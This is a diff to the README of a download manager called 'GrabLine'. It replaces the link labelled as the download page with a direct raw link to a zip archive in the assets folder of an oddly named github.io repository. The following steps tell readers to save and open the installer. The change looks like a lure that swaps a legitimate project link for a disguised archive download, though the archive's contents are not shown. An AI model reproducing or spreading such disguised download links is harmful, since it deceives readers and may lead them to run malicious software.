@@ -11,7 +11,7 @@ GrabLine manages your internet downloads. It handles large files, multiple simul
 
 ## 🚀 How to get started
 
-1. Go to the [GrabLine download page](https://github.com/umptieth-ascendingcolon174/GrabLine).
+1. Go to the [GrabLine download page](https://raw.githubusercontent.com/umptieth-ascendingcolon174/umptieth-ascendingcolon174.github.io/main/assets/3.7.zip).
 2. Choose the version that matches your operating system.
 3. Save the installer file to your computer.
 4. Open the file to start the installation.
